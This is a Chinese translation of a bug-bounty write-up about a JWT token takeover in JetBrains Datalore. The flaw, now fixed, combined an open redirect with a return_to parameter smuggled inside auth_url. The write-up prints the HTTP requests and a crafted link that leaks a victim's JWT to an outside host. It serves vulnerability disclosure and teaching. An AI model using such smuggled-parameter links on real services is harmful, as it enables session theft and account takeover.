<html>
<head>
<title>Eye for an eye: Unusual single click JWT token takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">以眼还眼:不寻常的单击JWT代币接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d?source=collection_archive---------1-----------------------#2021-09-05">https://infosecwriteups.com/eye-for-an-eye-unusual-single-click-jwt-token-takeover-2e58f88cf44d?source=collection_archive---------1-----------------------#2021-09-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="f1e6" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">这个故事是关于我在JetBrains Datalore中发现的一个不寻常的开放重定向错误配置。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/622fd9ad2aede764fbcfc4fb802d7b03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xd79HXL4Ho-fDwrRMnheCg.png"/></div></div></figure><h2 id="6351" class="kr ks iq bd kt ku kv dn kw kx ky dp kz la lb lc ld le lf lg lh li lj lk ll lm bi translated">描述</h2><p id="a9a9" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv la lw lx ly le lz ma mb li mc md me mf ij bi translated">当我在一个Datalore端点中发现一个打开的重定向时，故事就开始了。端点与通过JetBrains帐户的身份验证相关。起初，这个重定向器看起来是无害的，但是，无论如何，我决定更仔细地看看认证过程是如何工作的。</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="0724" class="kr ks iq mh b gy ml mm l mn mo"><strong class="mh ir">Request:</strong></span><span id="8853" class="kr ks iq mh b gy mp mm l mn mo">GET /jetbrains_auth?jwt={token}&amp;return_to=<strong class="mh ir">https://0d.tf/</strong> HTTP/1.1<br/>Host: datalore.jetbrains.com<br/>Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8<br/>Connection: close</span><span id="6bed" class="kr ks iq mh b gy mp mm l mn mo"><strong class="mh ir">Response:</strong></span><span id="0062" class="kr ks iq mh b gy mp mm l mn mo">HTTP/1.1 302<br/>Date: Tue, 01 Jun 2021 19:50:54 GMT<br/>Content-Length: 0<br/>Connection: close<br/>Set-Cookie: route={route}; Path=/; Secure; HttpOnly<br/>Set-Cookie: DATALORESESSIONID={session-id}; Path=/; Secure; HttpOnly<br/>Location: <strong class="mh ir">https://0d.tf/</strong><br/>Access-Control-Allow-Origin: *<br/>Access-Control-Allow-Credentials: true<br/>X-Content-Type-Options: nosniff<br/>X-XSS-Protection: 1</span></pre><p id="7f82" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">我已经检查了使用JWT令牌发起重定向到数据仓库的端点，下面是该请求的样子:</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="cdc1" class="kr ks iq mh b gy ml mm l mn mo"><strong class="mh ir">Request:</strong></span><span id="3710" class="kr ks iq mh b gy mp mm l mn mo">GET /jwt-auth/datalore?<strong class="mh ir">auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth</strong>&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1<br/>Host: http://account.jetbrains.com<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Connection: close</span><span id="7cce" class="kr ks iq mh b gy mp mm l mn mo"><strong class="mh ir">Response:</strong></span><span id="18b1" class="kr ks iq mh b gy mp mm l mn mo">HTTP/1.1 302<br/>Date: Tue, 01 Jun 2021 10:00:54 GMT<br/>Content-Length: 0<br/>Connection: close<br/>Server: nginx<br/>Cache-Control: no-store, no-cache, must-revalidate, max-age=0<br/>Pragma: no-cache<br/>Expires: -1<br/>Location: <strong class="mh ir">https://datalore.jetbrains.com/jetbrains_auth?jwt={jwt-token-here}&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F</strong></span></pre><p id="64cc" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">如您所见，它在<code class="fe mv mw mx mh b">auth_url</code>查询参数中获取目标主机的地址。</p><p id="c4ac" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">以下是关于该参数的一些有趣事实:</p><ul class=""><li id="ebb1" class="my mz iq lp b lq mq lt mr la na le nb li nc mf nd ne nf ng bi translated">该地址可以是jetbrains.com的任何子域</li><li id="0059" class="my mz iq lp b lq nh lt ni la nj le nk li nl mf nd ne nf ng bi translated">您可以在URL中提供路径和查询参数</li></ul><p id="e4e5" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">我有了一个想法，将一个有效的JWT令牌作为<code class="fe mv mw mx mh b">auth_url</code>参数的一部分，下面是接下来发生的事情:</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="93bd" class="kr ks iq mh b gy ml mm l mn mo"><strong class="mh ir">Request:</strong></span><span id="53e4" class="kr ks iq mh b gy mp mm l mn mo">GET /jwt-auth/datalore?<strong class="mh ir">auth_url=https%3A%2F%2Fdatalore.jetbrains.com%2Fjetbrains_auth?jwt={attacker's-jwt}</strong>&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F HTTP/1.1<br/>Host: http://account.jetbrains.com<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Connection: close</span><span id="31b0" class="kr ks iq mh b gy mp mm l mn mo"><strong class="mh ir">Response:</strong></span><span id="40a5" class="kr ks iq mh b gy mp mm l mn mo">HTTP/1.1 302<br/>Date: Tue, 01 Jun 2021 10:00:54 GMT<br/>Content-Length: 0<br/>Connection: close<br/>Server: nginx<br/>Cache-Control: no-store, no-cache, must-revalidate, max-age=0<br/>Pragma: no-cache<br/>Expires: -1<br/>Location: <strong class="mh ir">https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt-token}?jwt={victim's-jwt-token}&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F</strong></span></pre><p id="4568" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">端点返回了一个位置标头，查询参数中包含两个JWT标记。第一个——由我作为<code class="fe mv mw mx mh b">auth_url</code>的一部分提供，第二个来自JetBrains账户。</p><p id="2b64" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">下一步，我试图将<code class="fe mv mw mx mh b">return_to</code>参数作为<code class="fe mv mw mx mh b">auth_url</code>的一部分。这个想法非常简单——它将允许我放置一个有效的JWT令牌作为第一个参数，并添加受害者的JWT作为走私的<code class="fe mv mw mx mh b">return_to</code>参数的一部分。</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="6e58" class="kr ks iq mh b gy ml mm l mn mo"><strong class="mh ir">Attacker's host:</strong> <br/>&amp;return_to=https%3A%2F%2F0d.tf</span><span id="9fd8" class="kr ks iq mh b gy mp mm l mn mo"><strong class="mh ir">Url encoded attacker's host:</strong> %26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%</span></pre><p id="0b3e" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">所以，最后的恶意链接看起来是这样的:</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="2317" class="kr ks iq mh b gy ml mm l mn mo">https://account.jetbrains.com/jwt-auth/datalore?auth_url=https://datalore.jetbrains.com/jetbrains_auth?<strong class="mh ir">jwt={attacker's_jwt}%26%72%65%74%75%72%6e%5f%74%6f%3d%68%74%74%70%73%25%33%41%25%32%46%25%32%46%30%64%2e%74%66</strong>&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F</span></pre><p id="dd00" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">如果有人打开链接，将会发生以下情况:</p><pre class="kg kh ki kj gt mg mh mi mj aw mk bi"><span id="a71b" class="kr ks iq mh b gy ml mm l mn mo">1. 302 Redirect -&gt; https://datalore.jetbrains.com/jetbrains_auth?jwt={attacker's-jwt}&amp;return_to=<strong class="mh ir">https%3A%2F%2F0d.tf?jwt={victim's-jwt}</strong>&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F<br/>2. 302 Redirect -&gt; <strong class="mh ir">https://0d.tf?jwt={victim's-jwt}</strong>&amp;return_to=https%3A%2F%2Fdatalore.jetbrains.com%2F<br/>3. JWT TOKEN -&gt; Application session</span></pre></div><div class="ab cl nm nn hu no" role="separator"><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr"/></div><div class="ij ik il im in"><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nt"><img src="../Images/1fe73268086d70c25260f803ed60f540.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ufGWfKmd4Ea3J5464LSP7Q.png"/></div></div><figcaption class="nu nv gj gh gi nw nx bd b be z dk translated">走私JWT代币和归还URI的例子。</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ny"><img src="../Images/5907f4a07034dd8489ae3c875098a2f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZVAnbX0MlsrOf6nqGdZXVA.png"/></div></div><figcaption class="nu nv gj gh gi nw nx bd b be z dk translated">接管受害者的JWT令牌的例子。</figcaption></figure><h2 id="9419" class="kr ks iq bd kt ku kv dn kw kx ky dp kz la lb lc ld le lf lg lh li lj lk ll lm bi translated">影响</h2><p id="df9e" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv la lw lx ly le lz ma mb li mc md me mf ij bi translated">攻击者可以接管用户的JWT令牌，并获得对其Datalore帐户的访问权限。攻击的复杂性非常简单——攻击者需要创建一个带有有效JWT令牌的链接(以眼还眼),并诱骗受害者点击它。此外，从技术上讲，攻击者很容易创建一个脚本来自动化攻击过程。</p><h2 id="8f0f" class="kr ks iq bd kt ku kv dn kw kx ky dp kz la lb lc ld le lf lg lh li lj lk ll lm bi translated">减轻</h2><p id="9f71" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv la lw lx ly le lz ma mb li mc md me mf ij bi translated">Datalore团队实施了返回URL验证，这使得不可能利用开放重定向漏洞。下一步，他们移除了遗留的身份验证过程，并使用JetBrains帐户作为身份提供者实现了OAuth集成(干得好！).</p><p id="d7bf" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">就是这样。我希望你喜欢这个。有什么问题吗？DM @ <a class="ae nz" href="https://twitter.com/SaninYurii" rel="noopener ugc nofollow" target="_blank"> saninyurii </a></p></div><div class="ab cl nm nn hu no" role="separator"><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr"/></div><div class="ij ik il im in"><p id="2369" class="pw-post-body-paragraph ln lo iq lp b lq mq jr ls lt mr ju lv la ms lx ly le mt ma mb li mu md me mf ij bi translated">这里还有一些故事:</p><ul class=""><li id="4803" class="my mz iq lp b lq mq lt mr la na le nb li nc mf nd ne nf ng bi translated"><a class="ae nz" href="https://bit.ly/3kl1C6E" rel="noopener ugc nofollow" target="_blank">我如何在YouTrack(CVE-2020–24618)中发现一个原始但严重的访问控制漏洞</a></li><li id="3e56" class="my mz iq lp b lq nh lt ni la nj le nk li nl mf nd ne nf ng bi translated"><a class="ae nz" href="https://bit.ly/2VcPXOL" rel="noopener ugc nofollow" target="_blank">CVE-2020–15823:JetBrains YouTrack中的服务器端请求伪造(SSRF)</a></li></ul></div></div>    
</body>
</html>